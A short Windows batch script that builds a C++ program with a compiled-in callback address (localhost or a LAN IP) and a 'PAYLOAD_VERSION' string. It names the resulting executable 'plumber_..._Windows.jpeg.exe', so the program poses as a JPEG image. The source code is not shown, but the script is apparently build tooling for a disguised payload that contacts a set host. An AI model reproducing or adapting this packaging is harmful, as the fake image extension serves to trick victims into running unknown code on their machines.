@echo off

SET s=Windows
SET v=1.0.1
SET f=f3
SET ver="%s% v%v% %f%"
SET verid="%v%%f%"

SET local="127.0.0.1"
SET casa="192.168.1.37"

SET env=%local%
if "%1" == "casa" SET env=%casa%

cl /c /EHsc /DADDRESS=""%env%"" /DPAYLOAD_VERSION=""%ver%"" src\main.cpp
rc res\resource.rc
link res\resource.res main.obj /OUT:plumber_%verid%_%s%.jpeg.exe
del main.obj
rem cl /EHsc /DADDRESS=""%env%"" /DPAYLOAD_VERSION=""%ver%"" /Feplumber_%verid%_%s%.jpeg.exe main.cpp
